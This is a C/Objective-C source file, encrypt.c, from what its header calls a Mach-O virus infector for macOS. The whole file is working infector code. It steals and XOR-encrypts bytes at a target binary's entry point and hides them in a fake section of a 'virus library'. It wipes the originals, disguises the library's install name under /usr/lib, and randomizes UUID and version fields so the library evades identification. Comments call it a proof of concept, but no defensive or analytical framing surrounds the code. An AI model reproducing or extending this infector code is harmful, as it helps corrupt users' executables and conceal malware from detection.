/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * encrypt.c
 *
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include "fileoperations.h"
#include "encrypt.h"
#include "configuration.h"

static void encrypt_bytes(uint8_t *buf, uint64_t size);
static void store_bytes_aux(uint8_t *buf, uint64_t size, target_info_t *targetInfo, uint8_t *virusBuffer, uint64_t virusSize);
static uint64_t gen_random_crypt_size(uint64_t maxCryptSize);
static void store_bytes(uint8_t *cryptedBuf, uint64_t cryptedBufSize, target_info_t *targetInfo);

/*
 * this is the main encryption function
 * it will read a random size buffer of the target binary to infect
 * crypt it, and write it to the virus library
 */
int
encrypt_target(target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
    printf("[DEBUG] Header at encrypt_target %x\n", *(uint32_t*)targetInfo->buffer);
#endif
    uint64_t entrypointOffset = 0;
    uint64_t maxCryptSize = 0;
    // we need to calculate entry point offset
    // we distinguish between an executable target and a library target
    // since libraries have no entrypoint
    // FIXME: just encrypt the __text section from the beginning for both cases ???
    if (targetInfo->entrypoint)
    {
        entrypointOffset = targetInfo->entrypoint - targetInfo->textAddress + targetInfo->textOffset;
        // to generate a random encrypt size
        // use the maximum possible size between entry point and end of file as top range
        maxCryptSize = targetInfo->textAddress + targetInfo->textSize - targetInfo->entrypoint;
    }
    else
    {
        entrypointOffset = targetInfo->textOffset;
        maxCryptSize = targetInfo->textSize;
    }

    // get a random size to be encrypted
    uint64_t toEncryptSize = gen_random_crypt_size(maxCryptSize);
#if DEBUG
    printf("[DEBUG] original code bytes %x %x\n", *(uint32_t*)(targetInfo->buffer + entrypointOffset), *(uint32_t*)(targetInfo->buffer + entrypointOffset+4));
    printf("[DEBUG] To encrypt size %lld Max size %lld\n", toEncryptSize, maxCryptSize);
#endif
    // read the original bytes into a buffer
    uint8_t *originalBytesBuffer = malloc(toEncryptSize);
    if (originalBytesBuffer == NULL) return 1;
    memcpy(originalBytesBuffer, targetInfo->buffer + entrypointOffset, toEncryptSize);
    // encrypt the stolen bytes
    encrypt_bytes(originalBytesBuffer, toEncryptSize);
#if DEBUG
    printf("[DEBUG] crypted code bytes %x %x\n", *(uint32_t*)originalBytesBuffer, *(uint32_t*)(originalBytesBuffer+4));
#endif
    // store the stolen bytes in the virus library buffer
    store_bytes(originalBytesBuffer, toEncryptSize, targetInfo);
    // erase the original bytes
    memset(targetInfo->buffer+entrypointOffset, 0, toEncryptSize);
    // cleanup
    free(originalBytesBuffer);
    return 0;
}

static uint64_t
gen_random_crypt_size(uint64_t maxCryptSize)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    uint64_t toEncryptSize = 0;
    // we shouldn't get stuck in a loop if there's not enough bytes to respect the minimum
    if (maxCryptSize < MIN_BYTES_TO_ENCRYPT)
    {
        toEncryptSize = maxCryptSize;
    }
    else
    {
        toEncryptSize = arc4random() % maxCryptSize;
        // we want a minimum of bytes to encrypt
        while (toEncryptSize < MIN_BYTES_TO_ENCRYPT)
        {
            toEncryptSize = arc4random() % maxCryptSize;
        }
    }
    return toEncryptSize;
}

/*
 * function to encrypt the stolen bytes
 */
static void 
encrypt_bytes(uint8_t *buf, uint64_t size)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // for new we just use a simple XOR
    uint32_t xorkey = 0x76863345;
    for (uint64_t i = 0; i < size; i++)
    {
        buf[i] ^= xorkey;
    }
}

#pragma mark Functions to store the encrypted bytes into the virus library

/*
 * the entrypoint function that would support fat and non-fat targets
 */
static void
store_bytes(uint8_t *cryptedBuf, uint64_t cryptedBufSize, target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // we need to load the virus library
    uint8_t *virusBuffer = NULL;
    uint64_t virusSize = 0;
    virusSize = read_target(&virusBuffer, VIRUS_LIBRARY_PATH);
    int32_t magic = *(uint32_t*)virusBuffer;
    
    if (magic == FAT_CIGAM)
    {
        // UNSUPPORTED
    }
    else
    {
        store_bytes_aux(cryptedBuf, cryptedBufSize, targetInfo, virusBuffer, virusSize);
    }
}

/*
 * store the encrypted buffer in the library itself
 * the modified virus library is stored in a buffer pointed by virus field in target_info_t structure
 */
static void 
store_bytes_aux(uint8_t *cryptedBuf, uint64_t cryptedBufSize, target_info_t *targetInfo, uint8_t *virusBuffer, uint64_t virusSize)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    @autoreleasepool 
    {        
        // process the header and modify the LINKEDIT section
        struct mach_header *mh = (struct mach_header*)virusBuffer;
        uint32_t headerSize = 0;
        uint32_t nrLoadCmds = mh->ncmds;
        uint32_t cputype    = mh->cputype; // we need these to save into the library info
        uint32_t cpusubtype = mh->cpusubtype;

        uint8_t *address          = NULL;
        uint8_t is64bits          = 0;
        uint64_t linkeditFileSize = 0;
        uint64_t linkeditOffset   = 0;
        uint64_t linkeditVMSize   = 0;
        
        if (mh->magic == MH_MAGIC)
        {
            headerSize = sizeof(struct mach_header);
            is64bits = 0;
        }
        else if (mh->magic == MH_MAGIC_64)
        {
            headerSize = sizeof(struct mach_header_64);
            is64bits = 1;
        }
        // first load cmd address
        address = virusBuffer + headerSize;
        
        struct load_command *loadCommand = NULL;
        struct section *fakeSection = NULL;
        struct section_64 *fakeSection64 = NULL;
        
        for (uint32_t i = 0; i < nrLoadCmds; i++)
        {
            loadCommand = (struct load_command*)address;
            // 32bits
            if (loadCommand->cmd == LC_SEGMENT)
            {
                struct segment_command *segmentCommand = (struct segment_command*)address;
                if (strncmp(segmentCommand->segname, "__LINKEDIT", 16) == 0)
                {
                    linkeditFileSize = segmentCommand->filesize;
                    linkeditOffset   = segmentCommand->fileoff;
                    linkeditVMSize   = segmentCommand->vmsize;
                    // modify the linkedit segment info
                    segmentCommand->filesize += cryptedBufSize;
                    // vmsize is always page aligned
                    uint64_t remainder = cryptedBufSize % 4096;
                    if (remainder != 0) segmentCommand->vmsize += cryptedBufSize + (4096 - remainder);
                }
                // store the offset location in DATA segment
                else if (strncmp(segmentCommand->segname, "__DATA", 16) == 0)
                {
                    struct section *sectionCommand = (struct section*)(address + sizeof(struct segment_command));
                    for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                    {
                        if (strncmp(sectionCommand->sectname, "__ln_symbol_ptr", 16) == 0)
                        {
                            // store pointer to this section so we can modify it later
                            // we can't modify it here because we might not have the LINKEDIT information
                            // LINKEDIT command is usually after the __DATA command
                            fakeSection = sectionCommand;
                        }
                        sectionCommand++;
                    }
                }
            }
            else if (loadCommand->cmd == LC_SEGMENT_64)
            {
                struct segment_command_64 *segmentCommand = (struct segment_command_64*)address;
                if (strncmp(segmentCommand->segname, "__LINKEDIT", 16) == 0)
                {
                    linkeditFileSize = segmentCommand->filesize;
                    linkeditOffset   = segmentCommand->fileoff;
                    linkeditVMSize   = segmentCommand->vmsize;
                    // modify the linkedit segment info
                    segmentCommand->filesize += cryptedBufSize;
                    // vmsize is always page aligned
                    uint64_t remainder = cryptedBufSize % 8192;
                    if (remainder != 0) segmentCommand->vmsize += cryptedBufSize + (8192 - remainder);
                }            
                // store the offset location in DATA segment
                else if (strncmp(segmentCommand->segname, "__DATA", 16) == 0)
                {
                    struct section_64 *sectionCommand = (struct section_64*)(address + sizeof(struct segment_command_64));
                    for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                    {
                        if (strncmp(sectionCommand->sectname, "__ln_symbol_ptr", 16) == 0)
                        {
                            // store pointer to this section so we can modify it later
                            // we can't modify it here because we might not have the LINKEDIT information
                            // LINKEDIT command is usually after the __DATA command
                            fakeSection64 = sectionCommand;
                        }
                        sectionCommand++;
                    }
                }
            }
            // sanitize the library identification field (LC_ID_DYLIB)
            // NOTE: use the same name as in filesystem because we will need to identify it later
            // inside the virus library
            else if (loadCommand->cmd == LC_ID_DYLIB)
            {
                struct dylib_command *dylibCommand = (struct dylib_command*)address;
                uint32_t stringSize = dylibCommand->cmdsize - sizeof(struct dylib_command);
#if 0
                NSString *path = @"/usr/lib";
                NSFileManager *fm = [NSFileManager new];
                NSArray *dirlist = [fm contentsOfDirectoryAtPath:path error:NULL];
                // we grab a randomized library from /usr/lib to replace the original one
                uint32_t dirlistCount = (uint32_t)[dirlist count];
                uint32_t index = arc4random() % dirlistCount;
                while (1)
                {
                    NSString *fullpath = [path stringByAppendingPathComponent:(NSString*)[dirlist objectAtIndex:index]];
                    NSUInteger fullpathSize = [fullpath lengthOfBytesUsingEncoding:NSUTF8StringEncoding]; // NULL not included in size
                    // verify if the new name will fit the available space
                    if (fullpathSize <= stringSize-1 && [[fullpath pathExtension] isEqualToString:@"dylib"])
                    {
                        memset(address+dylibCommand->dylib.name.offset, 0, stringSize);
                        memcpy(address+dylibCommand->dylib.name.offset, [fullpath UTF8String], fullpathSize);
                        break;
                    }
                    index = arc4random() % dirlistCount;
                }
#endif
                // FIXME: problem here since we are not verifying if there's enough space at the header
                // to hold the new string. the solution is to verify if it would fit when we generate the random 
                // name. hell with it, this is a PoC so we modify the library install name to be a big buffer
                // the problem with this approach is that the size field is fixed so it can be identified
                // a better solution would be to reorder the whole header :-)
                NSString *libraryId = [@"/usr/lib" stringByAppendingPathComponent:[NSString stringWithCString:targetInfo->injectionLibraryName encoding:NSUTF8StringEncoding]];
                memset(address+dylibCommand->dylib.name.offset, 0, stringSize);
                memcpy(address+dylibCommand->dylib.name.offset, [libraryId UTF8String], [libraryId length]);
                // randomize the struct dylib remaining fields (else they can be identified)
                // FIXME: maybe getting this into sane and valid values ?
                dylibCommand->dylib.timestamp = (uint32_t)arc4random();
                dylibCommand->dylib.current_version = (uint32_t)arc4random();
                dylibCommand->dylib.compatibility_version = (uint32_t)arc4random();
            }
            // also randomize LC_UUID
            else if (loadCommand->cmd == LC_UUID)
            {
                struct uuid_command *uuidCommand = (struct uuid_command*)address;
                for (int z = 0; z < 4 ; z++)
                {
                    *(uint32_t*)(uuidCommand->uuid+z*4) = arc4random();    
                }
            }
            // advance to next command
            address += loadCommand->cmdsize;
        }
        
        if (is64bits)
        {
            if (fakeSection64 != NULL)
            {
                fakeSection64->offset = (uint32_t)linkeditOffset + (uint32_t)linkeditFileSize;
                fakeSection64->size = cryptedBufSize;
            }
        }
        else
        {
            if (fakeSection != NULL)
            {
                // modify our fake section offset field to point to where the crypted data is
                fakeSection->offset = (uint32_t)linkeditOffset + (uint32_t)linkeditFileSize;
                // FIXME: for now we also store the size inside the fake header
                fakeSection->size = (uint32_t)cryptedBufSize;
            }
        }
        // allocate space for the new binary with crypted bytes
        uint8_t *tempBuffer = malloc(virusSize + cryptedBufSize);
        // copy the original
        memcpy(tempBuffer, virusBuffer, virusSize);
        // copy the encrypted bytes
        memcpy(tempBuffer+linkeditOffset+linkeditFileSize, cryptedBuf, cryptedBufSize); 
        // set the info into our structure
        targetInfo->virus.buffer     = tempBuffer;
        targetInfo->virus.size       = virusSize + cryptedBufSize;
        targetInfo->virus.cputype    = cputype;
        targetInfo->virus.cpusubtype = cpusubtype;
    }
}
